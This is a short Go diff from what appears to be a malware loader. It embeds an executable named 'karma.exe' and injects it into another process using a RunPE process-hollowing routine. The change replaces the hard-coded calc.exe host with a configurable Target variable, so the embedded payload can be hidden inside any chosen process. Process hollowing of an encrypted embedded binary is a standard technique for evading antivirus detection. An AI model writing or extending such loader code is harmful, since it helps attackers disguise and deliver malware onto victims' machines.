@@ -12,6 +12,7 @@ var (
 	aeskey string
 	X1     string
 	X2     string
+	Target string
 )
 
 //go:embed karma.exe
@@ -25,5 +26,5 @@ func main() {
 	if err != nil {
 		os.Exit(1)
 	}
-	runpe.Inject("C:\\Windows\\System32\\calc.exe", "", fileBytes)
+	runpe.Inject(Target, "", fileBytes)
 }
